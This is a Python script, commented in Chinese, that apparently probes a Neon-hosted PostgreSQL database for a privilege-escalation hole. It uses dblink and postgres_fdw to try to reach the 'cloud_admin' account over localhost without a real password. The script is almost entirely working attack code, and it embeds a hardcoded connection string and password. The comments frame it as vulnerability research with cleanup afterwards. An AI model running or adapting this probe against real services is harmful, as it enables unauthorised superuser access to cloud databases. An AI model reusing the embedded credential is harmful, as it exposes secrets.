# -*- coding: utf-8 -*-
"""独立提权路径验证:owner 直接 dblink 对照 vs postgres_fdw 直连 cloud_admin 免密通道
若 fdw 通而 dblink 被拦 = patch 漏 fdw(独立新洞)。零破坏:全 k_ 前缀,结束清理。"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
PWD = 'npg_cI5ynlaAqjU2'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:400]

print('create dblink:', q("CREATE EXTENSION IF NOT EXISTS dblink", fetch=False))
print('create postgres_fdw:', q("CREATE EXTENSION IF NOT EXISTS postgres_fdw", fetch=False))

# ============ [1] owner 直接 dblink 对照矩阵 ============
print('\n=== [1] dblink owner-direct matrix ===')
def dblink_probe(connstr, label):
    q("SELECT dblink_disconnect('k')", fetch=False)
    r = q("SELECT dblink_connect('k', '%s')" % connstr.replace("'", "''"))
    if isinstance(r, str) and r.startswith('ERR'):
        print('  %s: CONNECT-FAIL %s' % (label, r[:200]))
        return
    r2 = q("SELECT * FROM dblink('k', 'SELECT current_user') AS t(u text)")
    print('  %s: CONNECT-OK current_user=%s' % (label, r2))
    q("SELECT dblink_disconnect('k')", fetch=False)

dblink_probe("host=127.0.0.1 port=5432 user=cloud_admin dbname=postgres connect_timeout=5", 'dblink 127:5432 cloud_admin no-pass')
dblink_probe("host=127.0.0.1 port=5432 user=cloud_admin password=x dbname=postgres connect_timeout=5", 'dblink 127:5432 cloud_admin pwd-x')

# ============ [2] fdw 直连 cloud_admin ============
print('\n=== [2] fdw to cloud_admin ===')
q('DROP SERVER IF EXISTS k_fsrv CASCADE', fetch=False)
r = q("CREATE SERVER k_fsrv FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host '127.0.0.1', port '5432', dbname 'postgres', connect_timeout '5')", fetch=False)
print('create server:', r)
if r == 'OK':
    # user mapping:先试 no-password(trust 免密)
    r2 = q("CREATE USER MAPPING FOR neondb_owner SERVER k_fsrv OPTIONS (user 'cloud_admin')", fetch=False)
    print('user mapping no-pass:', r2)
    if isinstance(r2, str) and r2.startswith('ERR'):
        r2b = q("CREATE USER MAPPING FOR neondb_owner SERVER k_fsrv OPTIONS (user 'cloud_admin', password 'x')", fetch=False)
        print('user mapping pwd-x:', r2b)
    # IMPORT postgres 库 public schema(验证连接 + 看平台表)
    q('DROP SCHEMA IF EXISTS k_fimp CASCADE', fetch=False)
    print('create schema:', q('CREATE SCHEMA k_fimp', fetch=False))
    r3 = q("IMPORT FOREIGN SCHEMA public LIMIT TO (health_check) FROM SERVER k_fsrv INTO k_fimp", fetch=False)
    print('import health_check:', r3)
    if r3 == 'OK':
        r4 = q("SELECT count(*) FROM k_fimp.health_check", fetch=False)
        print('SELECT via fdw:', r4)
        r5 = q("SELECT * FROM k_fimp.health_check LIMIT 2", fetch=False)
        print('rows:', str(r5)[:300])
    else:
        # fallback:手动建 foreign table 验证连接
        print('fallback manual ft...')
        r3b = q("CREATE FOREIGN TABLE k_fimp.k_ft (id int) SERVER k_fsrv OPTIONS (table_name 'health_check')", fetch=False)
        print('manual ft:', r3b)

# ============ [3] 清理 ============
q('DROP SCHEMA IF EXISTS k_fimp CASCADE', fetch=False)
q('DROP SERVER IF EXISTS k_fsrv CASCADE', fetch=False)
print('DROP fdw ext:', q('DROP EXTENSION IF EXISTS postgres_fdw', fetch=False))
print('DROP dblink ext:', q('DROP EXTENSION IF EXISTS dblink', fetch=False))
print('final ext:', q("SELECT extname FROM pg_extension"))
conn.close()
